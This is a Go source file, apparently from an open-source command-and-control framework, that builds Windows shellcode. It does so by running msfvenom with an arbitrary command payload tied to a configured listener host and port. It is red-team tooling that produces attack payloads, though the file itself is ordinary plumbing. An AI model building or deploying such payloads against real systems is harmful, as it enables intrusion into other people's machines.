package payload

import (
	"fmt"
	"os"
	"slices"

	"github.com/google/uuid"
	"github.com/hideckies/hermit/pkg/common/meta"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/state"
)

type Shellcode struct {
	Id        uint
	Uuid      string
	Name      string
	Os        string
	Arch      string
	Format    string
	Lprotocol string
	Lhost     string
	Lport     uint16
	Type      string
	TypeArgs  string
}

func NewShellcode(
	id uint,
	_uuid string,
	name string,
	os string,
	arch string,
	format string,
	lprotocol string,
	lhost string,
	lport uint16,
	shcType string,
	shcTypeArgs string,
) *Shellcode {
	if _uuid == "" {
		_uuid = uuid.NewString()
	}
	if name == "" {
		name = utils.GenerateRandomAnimalName(false, "shellcode")
	}

	return &Shellcode{
		Id:        id,
		Uuid:      _uuid,
		Name:      name,
		Os:        os,
		Arch:      arch,
		Format:    format,
		Lprotocol: lprotocol,
		Lhost:     lhost,
		Lport:     lport,
		Type:      shcType,
		TypeArgs:  shcTypeArgs,
	}
}

func (s *Shellcode) Generate(serverState *state.ServerState) (data []byte, outFile string, err error) {
	// Get the correspoiding listener
	liss, err := serverState.DB.ListenerGetAll()
	if err != nil {
		return nil, "", err
	}
	var lis *listener.Listener = nil
	for _, _lis := range liss {
		if _lis.Protocol == s.Lprotocol && (_lis.Addr == s.Lhost || slices.Contains(_lis.Domains, s.Lhost)) && _lis.Port == s.Lport {
			lis = _lis
			break
		}
	}
	if lis == nil {
		return nil, "", fmt.Errorf("the corresponding listener not found")
	}

	// Get output path
	payloadsDir, err := meta.GetPayloadsDir(lis.Name, false)
	if err != nil {
		return nil, "", err
	}
	outFile = fmt.Sprintf("%s/%s.%s.%s", payloadsDir, s.Name, s.Arch, s.Format)

	// Get request path
	// requestPathDownload := utils.GetRandomElemString(serverState.Conf.Listener.FakeRoutes["/stager/download"])

	// Change to the paylaod directory
	if s.Os == "linux" {
		return nil, "", fmt.Errorf("linux target is not implemented yet")
	} else if s.Os == "windows" {
		// // Change directory
		// os.Chdir("./payload/win/shellcode")
		// _, err = meta.ExecCommand("rm", "-rf", "build")
		// if err != nil {
		// 	os.Chdir(serverState.CWD)
		// 	return nil, "", err
		// }

		// // Set target
		// var target string
		// if s.Os == "windows" {
		// 	target = fmt.Sprintf("win-%s", s.Arch)
		// } else {
		// 	target = fmt.Sprintf("linux-%s", s.Arch)
		// }

		// fmt.Printf("Target: %s\n", target)

		// _, err = meta.ExecCommand(
		// 	"make",
		// 	target,
		// 	fmt.Sprintf("OUTPUT=\"%s\"", outFile),
		// 	fmt.Sprintf("PAYLOAD_NAME=%s", s.Name),
		// 	fmt.Sprintf("PAYLOAD_ARCH=%s", s.Arch),
		// 	fmt.Sprintf("PAYLOAD_FORMAT=%s", s.Format),
		// 	fmt.Sprintf("LISTENER_HOST=\"%s\"", s.Lhost),
		// 	fmt.Sprintf("LISTENER_PORT=%s", fmt.Sprint(s.Lport)),
		// 	// fmt.Sprintf("REQUEST_PATH_DOWNLOAD=\"%s\"", requestPathDownload),
		// 	"-j", fmt.Sprint(serverState.NumCPU),
		// )
		// if err != nil {
		// 	os.Chdir(serverState.CWD)
		// 	return nil, "", fmt.Errorf("build error: %v", err)
		// }

		// For now, uses msfvenom
		var msfArgs []string
		// var originalFile string = ""

		if s.Type == "cmd" {
			msfArgs = []string{
				"-a",
				s.Arch,
				"--platform",
				s.Os,
				"-p",
				fmt.Sprintf("%s/%s/exec", s.Os, s.Arch),
				fmt.Sprintf("CMD=\"%s\"", s.TypeArgs),
				"-f",
				"raw",
				"-b",
				"\\x00\\x0a\\x0d",
				"-o",
				outFile,
			}

		} else {
			return nil, "", fmt.Errorf("invalid shellcode type")
		}

		// If msfvenom, ignore the command output.
		_, err = meta.ExecCommand("msfvenom", msfArgs...)
		if err != nil {
			return nil, "", fmt.Errorf("ShellcodeGenerationError: %s", err)
		}
	}

	data, err = os.ReadFile(outFile)
	if err != nil {
		os.Chdir(serverState.CWD)
		return nil, "", err
	}

	// Go back to the current directory
	os.Chdir(serverState.CWD)

	return data, outFile, nil
}
